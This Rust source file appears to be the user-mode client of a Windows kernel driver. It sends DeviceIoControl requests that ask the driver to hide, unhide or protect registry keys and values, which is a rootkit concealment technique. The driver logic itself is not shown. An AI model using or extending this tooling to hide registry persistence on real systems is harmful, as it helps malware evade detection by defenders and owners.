use {
    crate::utils::open_driver,
    log::*,
    shared::structs::TargetRegistry,
    std::{ffi::c_void, ptr::null_mut},
    windows_sys::Win32::{
        System::IO::DeviceIoControl,
        Foundation::{CloseHandle, GetLastError, HANDLE},
    },
};

pub struct Registry {
    driver_handle: HANDLE,
}

impl Registry {
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Failed to open driver");
        Registry { driver_handle }
    }

    pub fn registry_protection(self, ioctl_code: u32, value: &String, key: &String, enable: bool) {
        info!("Attempting to open the registry for protection operation");
    
        debug!("Preparing structure for Key: {key} | Value: {value} | Protection: {}", if enable { "hide" } else { "unhide" });
        let mut info_registry = TargetRegistry {
            enable,
            value: value.to_string(),
            key: key.to_string(),
        };
    
        debug!("Sending DeviceIoControl command to {} protection for key: {key} | value: {value}", if enable { "enable" } else { "disable" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_registry as *mut _ as *mut c_void,
                std::mem::size_of::<TargetRegistry>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };
    
        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Registry protection {} for Key: {key} and Value: {value} succeeded", if enable { "enabled" } else { "disabled" });
        }
    }
    
    pub fn registry_hide_unhide(self, ioctl_code: u32, value: &String, key: &String, enable: bool) {
        info!("Attempting to open the registry for hide/unhide operation");

        debug!("Preparing structure for Key: {key} | Value: {value} | Operation: {}", if enable { "hide" } else { "unhide" });
        let mut info_registry = TargetRegistry {
            enable,
            key: key.to_string(),
            value: value.to_string(),
            ..Default::default()
        };
    
        debug!("Sending DeviceIoControl command to {} registry for Key: {key} | Value: {value}", if enable { "hide" } else { "unhide" });
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_registry as *mut _ as *mut c_void,
                std::mem::size_of::<TargetRegistry>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };
    
        if status == 0 {
            error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            info!("Registry with Key: {key} and Value: {value} successfully {}hidden", if enable { "" } else { "un" });
        }
    }    
}

impl Drop for Registry {
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}